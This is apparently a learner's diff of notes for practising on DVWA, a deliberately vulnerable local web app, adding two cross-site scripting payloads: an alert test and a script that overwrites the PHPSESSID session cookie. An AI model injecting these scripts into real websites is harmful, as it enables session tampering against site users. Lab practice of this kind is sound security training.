@@ -1,1 +1,10 @@
 http://localhost/DVWA-master/setup.php  #to open dvwa
+
+<script>alert("This is XSS Exploit test")</script>
+
+
+<script>
+  // Change the session cookie (or any other cookie)
+  document.cookie = "PHPSESSID=hackedSession123; path=/";
+  alert("Session cookie changed!");
+</script>
